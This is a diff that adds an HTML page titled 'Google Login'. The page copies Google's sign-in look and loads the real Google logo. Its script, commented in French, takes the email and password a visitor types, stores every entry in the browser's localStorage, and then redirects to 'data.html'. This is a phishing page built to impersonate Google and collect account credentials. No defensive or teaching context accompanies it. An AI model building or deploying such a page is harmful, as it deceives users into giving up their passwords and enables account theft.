@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f9f9f9;
+        }
+        .login-container {
+            width: 350px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+        }
+        .login-container img {
+            margin-bottom: 20px;
+            width: 150px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 14px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #4285f4;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #357ae8;
+        }
+        .forgot {
+            display: block;
+            margin-top: 10px;
+            color: #4285f4;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .forgot:hover {
+            text-decoration: underline;
+        }
+    </style>
+    <script>
+        function saveLogin(event) {
+            event.preventDefault(); // Empêche l'envoi classique du formulaire
+
+            // Récupérer les valeurs des champs
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            // Charger les identifiants existants ou créer une liste vide
+            let logins = JSON.parse(localStorage.getItem("logins")) || [];
+
+            // Ajouter les nouvelles informations
+            logins.push({ email, password });
+
+            // Sauvegarder dans le LocalStorage
+            localStorage.setItem("logins", JSON.stringify(logins));
+
+            // Redirection vers la page blanche
+            window.location.href = "data.html";
+        }
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+        <form onsubmit="saveLogin(event)">
+            <input type="email" id="email" placeholder="Email or phone" required>
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <button type="submit">Login</button>
+            <a href="#" class="forgot">Forgot email?</a>
+        </form>
+    </div>
+</body>
+</html>
